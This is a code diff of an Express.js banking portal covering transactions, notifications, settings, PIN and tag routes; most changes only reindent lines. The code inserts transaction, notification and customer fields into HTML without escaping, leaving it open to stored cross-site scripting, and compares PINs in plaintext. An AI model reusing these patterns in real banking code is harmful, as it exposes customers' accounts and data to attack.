+  res.redirect("/withdrawal-accounts");
 });
 
 // ==========================================
@@ -5247,29 +5175,29 @@ app.get("/withdrawal-accounts/delete/:accountId", requireAuth, async (req, res) 
 // ==========================================
 
 app.get("/transactions", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const transactions = await getCustomerTransactions(req.session.customerId, 100);
-    const currency = customer.currency || "EUR";
-    const filter = req.query.filter || "all";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const transactions = await getCustomerTransactions(req.session.customerId, 100);
+  const currency = customer.currency || "EUR";
+  const filter = req.query.filter || "all";
 
-    let filteredTx = filter === "in" ? transactions.filter((tx) => tx.type === "credit") : filter === "out" ? transactions.filter((tx) => tx.type === "debit") : transactions;
-    const groupedTransactions = groupTransactionsByDate(filteredTx);
+  let filteredTx = filter === "in" ? transactions.filter((tx) => tx.type === "credit") : filter === "out" ? transactions.filter((tx) => tx.type === "debit") : transactions;
+  const groupedTransactions = groupTransactionsByDate(filteredTx);
 
-    let transactionsHtml = Object.keys(groupedTransactions).length === 0 ? `<div class="no-transactions"><p>No transactions yet</p></div>` : "";
-    for (const [date, txs] of Object.entries(groupedTransactions)) {
-        transactionsHtml += `<div class="transaction-date-group">${date}</div>`;
-        txs.forEach((tx) => {
-            const icon = getTransactionIcon(tx.description || tx.recipientName || tx.senderName || "");
-            const isCredit = tx.type === "credit";
-            const name = isCredit ? tx.senderName || tx.description || "Deposit" : tx.recipientName || tx.description || "Payment";
-            const time = new Date(tx.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
-            transactionsHtml += `<div class="transaction-item"><div class="transaction-icon ${icon.color}">${icon.letter}</div><div class="transaction-content"><div class="transaction-main"><span class="transaction-name">${name}</span><span class="transaction-amount ${isCredit ? "positive" : "negative"}">${isCredit ? "+" : "-"}${formatCurrency(tx.amount, currency)}</span></div><div class="transaction-sub"><span class="transaction-category">${tx.description || (isCredit ? "Income" : "Payment")}</span><span class="transaction-time">${time}</span></div></div></div>`;
-        });
-    }
+  let transactionsHtml = Object.keys(groupedTransactions).length === 0 ? `<div class="no-transactions"><p>No transactions yet</p></div>` : "";
+  for (const [date, txs] of Object.entries(groupedTransactions)) {
+    transactionsHtml += `<div class="transaction-date-group">${date}</div>`;
+    txs.forEach((tx) => {
+      const icon = getTransactionIcon(tx.description || tx.recipientName || tx.senderName || "");
+      const isCredit = tx.type === "credit";
+      const name = isCredit ? tx.senderName || tx.description || "Deposit" : tx.recipientName || tx.description || "Payment";
+      const time = new Date(tx.createdAt).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
+      transactionsHtml += `<div class="transaction-item"><div class="transaction-icon ${icon.color}">${icon.letter}</div><div class="transaction-content"><div class="transaction-main"><span class="transaction-name">${name}</span><span class="transaction-amount ${isCredit ? "positive" : "negative"}">${isCredit ? "+" : "-"}${formatCurrency(tx.amount, currency)}</span></div><div class="transaction-sub"><span class="transaction-category">${tx.description || (isCredit ? "Income" : "Payment")}</span><span class="transaction-time">${time}</span></div></div></div>`;
+    });
+  }
 
-    const content = `<div class="account-header"><h1 class="page-title">Transactions</h1></div><div class="account-card"><div class="transactions-header"><div style="display: flex; gap: 8px;"><a href="/transactions?filter=all" class="btn ${filter === "all" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">All</a><a href="/transactions?filter=in" class="btn ${filter === "in" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">Incoming</a><a href="/transactions?filter=out" class="btn ${filter === "out" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">Outgoing</a></div><div class="transactions-filter"><div class="search-input"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg><input type="text" placeholder="Search" id="searchInput"></div></div></div><div class="transaction-list" style="max-height: none;">${transactionsHtml}</div></div><script>document.getElementById('searchInput').addEventListener('input', function(e) { const search = e.target.value.toLowerCase(); document.querySelectorAll('.transaction-item').forEach(item => { const name = item.querySelector('.transaction-name').textContent.toLowerCase(); item.style.display = name.includes(search) ? 'flex' : 'none'; }); });</script>`;
-    res.send(getPageWrapper(content, "transactions", customer, notificationCount));
+  const content = `<div class="account-header"><h1 class="page-title">Transactions</h1></div><div class="account-card"><div class="transactions-header"><div style="display: flex; gap: 8px;"><a href="/transactions?filter=all" class="btn ${filter === "all" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">All</a><a href="/transactions?filter=in" class="btn ${filter === "in" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">Incoming</a><a href="/transactions?filter=out" class="btn ${filter === "out" ? "btn-primary" : "btn-secondary"}" style="padding: 8px 16px; font-size: 13px;">Outgoing</a></div><div class="transactions-filter"><div class="search-input"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg><input type="text" placeholder="Search" id="searchInput"></div></div></div><div class="transaction-list" style="max-height: none;">${transactionsHtml}</div></div><script>document.getElementById('searchInput').addEventListener('input', function(e) { const search = e.target.value.toLowerCase(); document.querySelectorAll('.transaction-item').forEach(item => { const name = item.querySelector('.transaction-name').textContent.toLowerCase(); item.style.display = name.includes(search) ? 'flex' : 'none'; }); });</script>`;
+  res.send(getPageWrapper(content, "transactions", customer, notificationCount));
 });
 
 // ==========================================
@@ -5277,14 +5205,14 @@ app.get("/transactions", requireAuth, async (req, res) => {
 // ==========================================
 
 app.get("/notifications", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notifications = await getUnreadNotifications(req.session.customerId);
-    await markNotificationsAsRead(req.session.customerId);
+  const customer = await getCustomerById(req.session.customerId);
+  const notifications = await getUnreadNotifications(req.session.customerId);
+  await markNotificationsAsRead(req.session.customerId);
 
-    let notificationsHtml = notifications.length === 0 ? `<div style="text-align: center; padding: 60px; color: #888;"><p>No new notifications</p></div>` : notifications.map((notif) => { const icon = notif.notificationType === "credit" ? "💰" : notif.notificationType === "debit" ? "💸" : notif.notificationType === "warning" ? "⚠️" : "ℹ️"; return `<div style="padding: 16px 24px; border-bottom: 1px solid #f5f5f5; display: flex; gap: 12px;"><div style="font-size: 24px;">${icon}</div><div><h4 style="font-size: 14px; font-weight: 600; margin-bottom: 4px;">${notif.title}</h4><p style="font-size: 13px; color: #666;">${notif.message}</p><p style="font-size: 11px; color: #999; margin-top: 4px;">${formatDateShort(notif.createdAt)}</p></div></div>`; }).join("");
+  let notificationsHtml = notifications.length === 0 ? `<div style="text-align: center; padding: 60px; color: #888;"><p>No new notifications</p></div>` : notifications.map((notif) => { const icon = notif.notificationType === "credit" ? "💰" : notif.notificationType === "debit" ? "💸" : notif.notificationType === "warning" ? "⚠️" : "ℹ️"; return `<div style="padding: 16px 24px; border-bottom: 1px solid #f5f5f5; display: flex; gap: 12px;"><div style="font-size: 24px;">${icon}</div><div><h4 style="font-size: 14px; font-weight: 600; margin-bottom: 4px;">${notif.title}</h4><p style="font-size: 13px; color: #666;">${notif.message}</p><p style="font-size: 11px; color: #999; margin-top: 4px;">${formatDateShort(notif.createdAt)}</p></div></div>`; }).join("");
 
-    const content = `<a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 600px;"><div class="form-card" style="padding: 0;"><div style="padding: 20px 24px; border-bottom: 1px solid #f0f0f0;"><h2 style="font-size: 18px;">Notifications</h2></div>${notificationsHtml}</div></div>`;
-    res.send(getPageWrapper(content, "dashboard", customer, 0));
+  const content = `<a href="/dashboard" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 600px;"><div class="form-card" style="padding: 0;"><div style="padding: 20px 24px; border-bottom: 1px solid #f0f0f0;"><h2 style="font-size: 18px;">Notifications</h2></div>${notificationsHtml}</div></div>`;
+  res.send(getPageWrapper(content, "dashboard", customer, 0));
 });
 
 // ==========================================
@@ -5292,17 +5220,17 @@ app.get("/notifications", requireAuth, async (req, res) => {
 // ==========================================
 
 app.get("/settings", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const currency = customer.currency || "EUR";
-    const currencyConfig = CURRENCIES[currency];
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const currency = customer.currency || "EUR";
+  const currencyConfig = CURRENCIES[currency];
 
-    let accountDetails = currency === "EUR" ? `<div class="settings-item"><span class="settings-item-label">IBAN</span><span class="settings-item-value"><code>${customer.iban}</code></span></div><div class="settings-item"><span class="settings-item-label">BIC</span><span class="settings-item-value"><code>${customer.bic}</code></span></div>` : currency === "GBP" ? `<div class="settings-item"><span class="settings-item-label">Account Number</span><span class="settings-item-value"><code>${customer.bankAccountNumber}</code></span></div><div class="settings-item"><span class="settings-item-label">Sort Code</span><span class="settings-item-value"><code>${customer.sortCode}</code></span></div>` : `<div class="settings-item"><span class="settings-item-label">Account Number</span><span class="settings-item-value"><code>${customer.bankAccountNumber}</code></span></div><div class="settings-item"><span class="settings-item-label">Routing Number</span><span class="settings-item-value"><code>${customer.routingNumber}</code></span></div>`;
+  let accountDetails = currency === "EUR" ? `<div class="settings-item"><span class="settings-item-label">IBAN</span><span class="settings-item-value"><code>${customer.iban}</code></span></div><div class="settings-item"><span class="settings-item-label">BIC</span><span class="settings-item-value"><code>${customer.bic}</code></span></div>` : currency === "GBP" ? `<div class="settings-item"><span class="settings-item-label">Account Number</span><span class="settings-item-value"><code>${customer.bankAccountNumber}</code></span></div><div class="settings-item"><span class="settings-item-label">Sort Code</span><span class="settings-item-value"><code>${customer.sortCode}</code></span></div>` : `<div class="settings-item"><span class="settings-item-label">Account Number</span><span class="settings-item-value"><code>${customer.bankAccountNumber}</code></span></div><div class="settings-item"><span class="settings-item-label">Routing Number</span><span class="settings-item-value"><code>${customer.routingNumber}</code></span></div>`;
 
-    const success = req.query.success;
-    let successHtml = success === "pin" ? `<div style="background: #E8F5E9; border: 1px solid #C8E6C9; color: #2E7D32; padding: 12px 16px; border-radius: 8px; margin-bottom: 24px;">✓ PIN updated successfully</div>` : success === "tag" ? `<div style="background: #E8F5E9; border: 1px solid #C8E6C9; color: #2E7D32; padding: 12px 16px; border-radius: 8px; margin-bottom: 24px;">✓ Tag updated successfully</div>` : "";
+  const success = req.query.success;
+  let successHtml = success === "pin" ? `<div style="background: #E8F5E9; border: 1px solid #C8E6C9; color: #2E7D32; padding: 12px 16px; border-radius: 8px; margin-bottom: 24px;">✓ PIN updated successfully</div>` : success === "tag" ? `<div style="background: #E8F5E9; border: 1px solid #C8E6C9; color: #2E7D32; padding: 12px 16px; border-radius: 8px; margin-bottom: 24px;">✓ Tag updated successfully</div>` : "";
 
-    const content = `
+  const content = `
     <div class="account-header"><h1 class="page-title">Settings</h1></div>
     ${successHtml}
     <div class="account-card" style="max-width: 700px;"><div style="padding: 24px;">
@@ -5310,7 +5238,6 @@ app.get("/settings", requireAuth, async (req, res) => {
         <div class="settings-item"><span class="settings-item-label">Name</span><span class="settings-item-value">${customer.name}</span></div>
         <div class="settings-item"><span class="settings-item-label">Email</span><span class="settings-item-value">${customer.email}</span></div>
         <div class="settings-item"><span class="settings-item-label">Phone</span><span class="settings-item-value">${customer.phone}</span></div>
-        <div class="settings-item"><span class="settings-item-label">Address</span><span class="settings-item-value">${customer.address || "N/A"}</span></div>
         <div class="settings-item"><span class="settings-item-label">Tag</span><span class="settings-item-value"><code>${customer.tag}</code><a href="/settings/change-tag" class="btn btn-secondary" style="padding: 6px 12px; font-size: 12px; margin-left: 12px;">Edit</a></span></div>
       </div>
       <div class="settings-section"><div class="settings-title">Security</div>
@@ -5328,46 +5255,46 @@ app.get("/settings", requireAuth, async (req, res) => {
       </div>
       <div style="margin-top: 32px; padding-top: 24px; border-top: 1px solid #f0f0f0;"><a href="/logout" class="btn btn-secondary btn-block" style="color: #E53935;">Logout</a></div>
     </div></div>`;
-    res.send(getPageWrapper(content, "settings", customer, notificationCount));
+  res.send(getPageWrapper(content, "settings", customer, notificationCount));
 });
 
 app.get("/settings/change-pin", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const error = req.query.error;
-    let errorHtml = error === "current" ? `<div class="login-error">Current PIN is incorrect.</div>` : error === "match" ? `<div class="login-error">New PINs do not match.</div>` : error === "format" ? `<div class="login-error">PIN must be 4-6 digits.</div>` : "";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const error = req.query.error;
+  let errorHtml = error === "current" ? `<div class="login-error">Current PIN is incorrect.</div>` : error === "match" ? `<div class="login-error">New PINs do not match.</div>` : error === "format" ? `<div class="login-error">PIN must be 4-6 digits.</div>` : "";
 
-    const content = `<a href="/settings" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 400px;"><div class="form-card"><div class="form-header"><h1>Change PIN</h1></div>${errorHtml}<form method="POST" action="/settings/change-pin"><div class="form-group"><label class="form-label">Current PIN</label><input type="password" name="currentPin" class="form-input" required maxlength="6"></div><div class="form-group"><label class="form-label">New PIN</label><input type="password" name="newPin" class="form-input" required maxlength="6"></div><div class="form-group"><label class="form-label">Confirm New PIN</label><input type="password" name="confirmPin" class="form-input" required maxlength="6"></div><button type="submit" class="btn btn-primary btn-block btn-lg">Update PIN</button><a href="/settings" class="btn btn-secondary btn-block" style="margin-top: 12px;">Cancel</a></form></div></div>`;
-    res.send(getPageWrapper(content, "settings", customer, notificationCount));
+  const content = `<a href="/settings" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 400px;"><div class="form-card"><div class="form-header"><h1>Change PIN</h1></div>${errorHtml}<form method="POST" action="/settings/change-pin"><div class="form-group"><label class="form-label">Current PIN</label><input type="password" name="currentPin" class="form-input" required maxlength="6"></div><div class="form-group"><label class="form-label">New PIN</label><input type="password" name="newPin" class="form-input" required maxlength="6"></div><div class="form-group"><label class="form-label">Confirm New PIN</label><input type="password" name="confirmPin" class="form-input" required maxlength="6"></div><button type="submit" class="btn btn-primary btn-block btn-lg">Update PIN</button><a href="/settings" class="btn btn-secondary btn-block" style="margin-top: 12px;">Cancel</a></form></div></div>`;
+  res.send(getPageWrapper(content, "settings", customer, notificationCount));
 });
 
 app.post("/settings/change-pin", requireAuth, async (req, res) => {
-    const { currentPin, newPin, confirmPin } = req.body;
-    const customer = await getCustomerById(req.session.customerId);
-    if (customer.pin !== currentPin) { return res.redirect("/settings/change-pin?error=current"); }
-    if (newPin !== confirmPin) { return res.redirect("/settings/change-pin?error=match"); }
-    if (!/^\d{4,6}$/.test(newPin)) { return res.redirect("/settings/change-pin?error=format"); }
-    await updateCustomerPin(req.session.customerId, newPin);
-    res.redirect("/settings?success=pin");
+  const { currentPin, newPin, confirmPin } = req.body;
+  const customer = await getCustomerById(req.session.customerId);
+  if (customer.pin !== currentPin) { return res.redirect("/settings/change-pin?error=current"); }
+  if (newPin !== confirmPin) { return res.redirect("/settings/change-pin?error=match"); }
+  if (!/^\d{4,6}$/.test(newPin)) { return res.redirect("/settings/change-pin?error=format"); }
+  await updateCustomerPin(req.session.customerId, newPin);
+  res.redirect("/settings?success=pin");
 });
 
 app.get("/settings/change-tag", requireAuth, async (req, res) => {
-    const customer = await getCustomerById(req.session.customerId);
-    const notificationCount = await getUnreadNotificationCount(req.session.customerId);
-    const error = req.query.error;
-    let errorHtml = error === "taken" ? `<div class="login-error">This tag is already taken.</div>` : error === "format" ? `<div class="login-error">Tag must be at least 3 characters (letters and numbers only).</div>` : "";
+  const customer = await getCustomerById(req.session.customerId);
+  const notificationCount = await getUnreadNotificationCount(req.session.customerId);
+  const error = req.query.error;
+  let errorHtml = error === "taken" ? `<div class="login-error">This tag is already taken.</div>` : error === "format" ? `<div class="login-error">Tag must be at least 3 characters (letters and numbers only).</div>` : "";
 
-    const content = `<a href="/settings" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 400px;"><div class="form-card"><div class="form-header"><h1>Change Tag</h1><p>Current tag: <code>${customer.tag}</code></p></div>${errorHtml}<form method="POST" action="/settings/change-tag"><div class="form-group"><label class="form-label">New Tag (without @)</label><input type="text" name="newTag" class="form-input" placeholder="username" required minlength="3" pattern="[a-zA-Z0-9]+"></div><button type="submit" class="btn btn-primary btn-block btn-lg">Update Tag</button><a href="/settings" class="btn btn-secondary btn-block" style="margin-top: 12px;">Cancel</a></form></div></div>`;
-    res.send(getPageWrapper(content, "settings", customer, notificationCount));
+  const content = `<a href="/settings" class="back-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a><div class="form-container" style="max-width: 400px;"><div class="form-card"><div class="form-header"><h1>Change Tag</h1><p>Current tag: <code>${customer.tag}</code></p></div>${errorHtml}<form method="POST" action="/settings/change-tag"><div class="form-group"><label class="form-label">New Tag (without @)</label><input type="text" name="newTag" class="form-input" placeholder="username" required minlength="3" pattern="[a-zA-Z0-9]+"></div><button type="submit" class="btn btn-primary btn-block btn-lg">Update Tag</button><a href="/settings" class="btn btn-secondary btn-block" style="margin-top: 12px;">Cancel</a></form></div></div>`;
+  res.send(getPageWrapper(content, "settings", customer, notificationCount));
 });
 
 app.post("/settings/change-tag", requireAuth, async (req, res) => {
-    const { newTag } = req.body;
-    if (!/^[a-zA-Z0-9]{3,}$/.test(newTag)) { return res.redirect("/settings/change-tag?error=format"); }
-    const available = await isTagAvailable(newTag, req.session.customerId);
-    if (!available) { return res.redirect("/settings/change-tag?error=taken"); }
-    await updateCustomerTag(req.session.customerId, newTag);
-    res.redirect("/settings?success=tag");
+  const { newTag } = req.body;
+  if (!/^[a-zA-Z0-9]{3,}$/.test(newTag)) { return res.redirect("/settings/change-tag?error=format"); }
+  const available = await isTagAvailable(newTag, req.session.customerId);
+  if (!available) { return res.redirect("/settings/change-tag?error=taken"); }
+  await updateCustomerTag(req.session.customerId, newTag);
+  res.redirect("/settings?success=tag");
 });
 
 // ==========================================
@@ -5375,13 +5302,13 @@ app.post("/settings/change-tag", requireAuth, async (req, res) => {
 // ==========================================
 
 app.use((err, req, res, next) => {
-    console.error("Error:", err);
-    res.status(500).send("Something went wrong!");
+  console.error("Error:", err);
+  res.status(500).send("Something went wrong!");
 });
 
 async function start() {
-    await connectDB();
-    app.listen(PORT, () => { console.log(`🏦 Banking Portal running on port ${PORT}`); });
+  await connectDB();
+  app.listen(PORT, () => { console.log(`🏦 Banking Portal running on port ${PORT}`); });
 }
 
 start();
